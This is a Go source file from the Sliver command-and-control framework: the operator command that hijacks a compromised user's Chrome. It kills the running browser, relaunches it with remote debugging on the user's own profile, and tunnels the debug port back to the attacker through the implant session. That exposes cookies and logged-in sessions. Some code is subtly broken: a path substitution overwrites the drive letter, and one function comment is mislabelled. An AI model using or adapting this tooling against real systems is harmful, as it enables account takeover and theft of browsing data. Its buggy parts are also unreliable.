package curse

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"errors"
	"fmt"
	"log"
	insecureRand "math/rand"
	"strings"
	"time"

	"github.com/AlecAivazis/survey/v2"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/tcpproxy"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
)

var (
	ErrUserDataDirNotFound      = errors.New("could not find Chrome user data dir")
	ErrChromeExecutableNotFound = errors.New("could not find Chrome executable")
	ErrUnsupportedOS            = errors.New("unsupported OS")

	windowsDriveLetters = "CDEFGHIJKLMNOPQRSTUVWXYZ"
)

// CursedChromeCmd - Execute a .NET assembly in-memory
func CursedChromeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}
	chromeProcess, err := getChromeProcess(session, ctx, con)
	if err != nil {
		con.PrintErrorf("%s", err)
		return
	}
	if chromeProcess != nil {
		con.PrintWarnf("Found running Chrome process: %d (ppid: %d)\n", chromeProcess.GetPid(), chromeProcess.GetPpid())
		con.PrintWarnf("Sliver will need to kill and restart the Chrome process in order to perform code injection.\n")
		con.PrintWarnf("Sliver will attempt to restore the user's session, however %sDATA LOSS MAY OCCUR!%s\n", console.Bold, console.Normal)
		con.Printf("\n")
		confirm := false
		err = survey.AskOne(&survey.Confirm{Message: "Kill and restore existing Chrome process?"}, &confirm)
		if err != nil {
			con.PrintErrorf("%s", err)
			return
		}
		if !confirm {
			return
		}
	}
	startCursedChromeProcess(true, session, ctx, con)
}

func startCursedChromeProcess(restore bool, session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (*core.CursedProcess, error) {
	con.PrintInfof("Finding Chrome executable path ... ")
	chromeExePath, err := findChromeExecutablePath(session, ctx, con)
	if err != nil {
		con.Printf("failure!\n")
		return nil, err
	}
	con.Printf("success!\n")
	con.PrintInfof("Finding Chrome user data directory ... ")
	chromeUserDataDir, err := findChromeUserDataDir(session, ctx, con)
	if err != nil {
		con.Printf("failure!\n")
		return nil, err
	}
	con.Printf("success!\n")

	con.PrintInfof("Starting Chrome process ... ")
	debugPort := uint16(ctx.Flags.Int("remote-debugging-port"))
	args := []string{
		fmt.Sprintf("--remote-debugging-port=%d", debugPort),
	}
	if restore {
		args = append(args, fmt.Sprintf("--user-data-dir=%s", chromeUserDataDir))
		args = append(args, "--restore-last-session")
	}

	// Execute the Chrome process with the extra flags
	// TODO: PPID spoofing, etc.
	chromeExec, err := con.Rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
		Request: con.ActiveTarget.Request(ctx),
		Path:    chromeExePath,
		Args:    args,
		Output:  false,
	})
	if err != nil {
		con.Printf("failure!\n")
		return nil, err
	}
	con.Printf("(pid: %d) success!\n", chromeExec.GetPid())

	con.PrintInfof("Waiting for Chrome process to initialize ... ")
	time.Sleep(2 * time.Second)

	bindPort := insecureRand.Intn(10000) + 40000
	bindAddr := fmt.Sprintf("127.0.0.1:%d", bindPort)

	remoteAddr := fmt.Sprintf("127.0.0.1:%d", debugPort)

	tcpProxy := &tcpproxy.Proxy{}
	channelProxy := &core.ChannelProxy{
		Rpc:             con.Rpc,
		Session:         session,
		RemoteAddr:      remoteAddr,
		BindAddr:        bindAddr,
		KeepAlivePeriod: 60 * time.Second,
		DialTimeout:     30 * time.Second,
	}
	tcpProxy.AddRoute(bindAddr, channelProxy)
	core.Portfwds.Add(tcpProxy, channelProxy)

	go func() {
		err := tcpProxy.Run()
		if err != nil {
			log.Printf("Proxy error %s", err)
		}
	}()

	con.PrintInfof("Port forwarding %s -> %s\n", bindAddr, remoteAddr)

	return nil, nil
}

func isChromeProcess(executable string) bool {
	var chromeProcessNames = []string{
		"chrome",        // Linux
		"chrome.exe",    // Windows
		"Google Chrome", // Darwin
	}
	for _, suffix := range chromeProcessNames {
		if strings.HasSuffix(executable, suffix) {
			return true
		}
	}
	return false
}

func getChromeProcess(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (*commonpb.Process, error) {
	ps, err := con.Rpc.Ps(context.Background(), &sliverpb.PsReq{
		Request: con.ActiveTarget.Request(ctx),
	})
	if err != nil {
		return nil, err
	}
	for _, process := range ps.Processes {
		if process.GetOwner() != session.GetUsername() {
			continue
		}
		if isChromeProcess(process.GetExecutable()) {
			return process, nil
		}
	}
	return nil, nil
}

func findChromeUserDataDir(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (string, error) {
	switch session.GetOS() {

	case "windows":
		for _, driveLetter := range windowsDriveLetters {
			userDataDir := fmt.Sprintf("%c:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data", driveLetter, session.GetUsername())
			ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
				Request: con.ActiveTarget.Request(ctx),
				Path:    userDataDir,
			})
			if err != nil {
				return "", err
			}
			if ls.GetExists() {
				return userDataDir, nil
			}
		}
		return "", ErrUserDataDirNotFound

	case "darwin":
		userDataDir := fmt.Sprintf("/Users/%s/Library/Application Support/Google/Chrome", session.Username)
		ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
			Request: con.ActiveTarget.Request(ctx),
			Path:    userDataDir,
		})
		if err != nil {
			return "", err
		}
		if ls.GetExists() {
			return userDataDir, nil
		}
		return "", ErrUserDataDirNotFound

	default:
		return "", errors.New("Unsupported OS")
	}
}

func findChromeExecutablePath(session *clientpb.Session, ctx *grumble.Context, con *console.SliverConsoleClient) (string, error) {
	switch session.GetOS() {

	case "windows":
		chromePaths := []string{
			"[DRIVE]:\\Program Files (x86)\\Google\\Chrome\\Application",
			"[DRIVE]:\\Program Files\\Google\\Chrome\\Application",
			"[DRIVE]:\\Users\\[USERNAME]\\AppData\\Local\\Google\\Chrome\\Application",
			"[DRIVE]:\\Program Files (x86)\\Google\\Application",
		}
		for _, driveLetter := range windowsDriveLetters {
			for _, chromePath := range chromePaths {
				chromeExecutablePath := strings.ReplaceAll(chromePath, "[DRIVE]", string(driveLetter))
				chromeExecutablePath = strings.ReplaceAll(chromePath, "[USERNAME]", session.GetUsername())
				ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
					Request: con.ActiveTarget.Request(ctx),
					Path:    chromeExecutablePath,
				})
				if err != nil {
					return "", err
				}
				if ls.GetExists() {
					return chromeExecutablePath, nil
				}
			}
		}
		return "", ErrChromeExecutableNotFound

	case "darwin":
		const defaultChromePath = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
		ls, err := con.Rpc.Ls(context.Background(), &sliverpb.LsReq{
			Request: con.ActiveTarget.Request(ctx),
			Path:    defaultChromePath,
		})
		if err != nil {
			return "", err
		}
		if ls.GetExists() {
			return defaultChromePath, nil
		}
		return "", ErrChromeExecutableNotFound

	default:
		return "", ErrUnsupportedOS
	}
}
